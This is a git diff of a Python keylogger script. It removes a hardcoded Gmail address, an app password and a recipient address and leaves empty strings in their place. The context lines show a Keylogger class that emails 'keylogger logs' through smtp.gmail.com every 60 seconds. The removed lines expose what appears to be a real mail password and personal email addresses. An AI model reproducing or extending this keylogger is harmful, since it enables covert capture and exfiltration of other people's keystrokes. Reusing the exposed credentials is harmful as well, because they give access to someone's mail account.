@@ -10,8 +10,8 @@ from email.mime.multipart import MIMEMultipart
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 # mail server parameters
-EMAIL_ADDRESS="key.logger.automated@gmail.com"
-EMAIL_PASSWORD="zvhpkhqpnczsxdiw"
+EMAIL_ADDRESS=""
+EMAIL_PASSWORD=""
 
 
 class Keylogger:
@@ -73,7 +73,7 @@ class Keylogger:
     def prepare_mail(self, message):
 
         
-        fromEmail = 'key.logger.automated@gmail.com'
+        fromEmail = ''
         mailSubject = "keylogger logs"
         recepientsMailList = ["iheb.yaakoubi@sesame.com.tn"]
 
@@ -90,11 +90,11 @@ class Keylogger:
     def sendmail(self, message):
         smtpHost = "smtp.gmail.com"
         smtpPort = 587
-        mailUname = 'key.logger.automated@gmail.com'
-        mailPwd = 'zvhpkhqpnczsxdiw'
+        mailUname = ''
+        mailPwd = ''
 
-        fromEmail = 'key.logger.automated@gmail.com'
-        recepientsMailList = ["iheb.yaakoubi@sesame.com.tn"]
+        fromEmail = ''
+        recepientsMailList = [""]
 
         s = smtplib.SMTP(smtpHost, smtpPort)
         s.starttls()
